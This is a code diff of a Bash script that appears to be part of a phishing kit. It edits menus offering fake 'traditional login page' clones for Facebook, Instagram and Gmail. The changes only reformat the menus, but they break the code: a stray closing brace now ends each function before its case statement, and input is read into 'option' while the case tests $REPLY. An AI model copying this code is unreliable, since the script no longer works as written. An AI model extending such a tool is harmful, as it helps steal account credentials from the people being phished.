@@ -401,13 +401,15 @@ custom_url() {
 
 ## Facebook
 site_facebook() {
-	cat <<- EOF
 
-		printf "%b" "${PURPLE}┃${RESET} ${CYAN}${BOLD}➤ [01]${RESET} ${LIGHT_CYAN}Página Tradicional De Login${RESET}\n"
+cat << EOF
 
-	EOF
+${PURPLE}┃${RESET} ${CYAN}${BOLD}➤ [01]${RESET} ${LIGHT_CYAN}Página Tradicional De Login${RESET}
 
-	read -p "${PURPLE}┗━${RESET} ${CYAN}${BOLD}Select an option:${RESET} "
+EOF
+
+read -p "${PURPLE}┗━${RESET} ${CYAN}${BOLD}Select an option:${RESET} " option
+}
 
 	case $REPLY in 
 		1 | 01)
@@ -434,13 +436,15 @@ site_facebook() {
 
 ## Instagram
 site_instagram() {
-	cat <<- EOF
+	
+cat << EOF
 
-		printf "%b" "${PURPLE}┃${RESET} ${CYAN}${BOLD}➤ [01]${RESET} ${LIGHT_CYAN}Página Tradicional De Login${RESET}\n"
+${PURPLE}┃${RESET} ${CYAN}${BOLD}➤ [01]${RESET} ${LIGHT_CYAN}Página Tradicional De Login${RESET}
 
-	EOF
+EOF
 
-	read -p "${PURPLE}┗━${RESET} ${CYAN}${BOLD}Select an option:${RESET} "
+read -p "${PURPLE}┗━${RESET} ${CYAN}${BOLD}Select an option:${RESET} " option
+}
 
 	case $REPLY in 
 		1 | 01)
@@ -464,16 +468,17 @@ site_instagram() {
 			{ sleep 1; clear; banner_small; site_instagram; };;
 	esac
 }
-
-## Gmail/Google
+#Gmail
 site_gmail() {
-	cat <<- EOF
 
-		printf "%b" "${PURPLE}┃${RESET} ${CYAN}${BOLD}➤ [01]${RESET} ${LIGHT_CYAN}Página Tradicional De Login${RESET}\n"
+cat << EOF
 
-	EOF
+${PURPLE}┃${RESET} ${CYAN}${BOLD}➤ [01]${RESET} ${LIGHT_CYAN}Página Tradicional De Login${RESET}
 
-	read -p "${PURPLE}┗━${RESET} ${CYAN}${BOLD}Select an option:${RESET} "
+EOF
+
+read -p "${PURPLE}┗━${RESET} ${CYAN}${BOLD}Select an option:${RESET} " option
+}
 
 	case $REPLY in 
 		1 | 01)
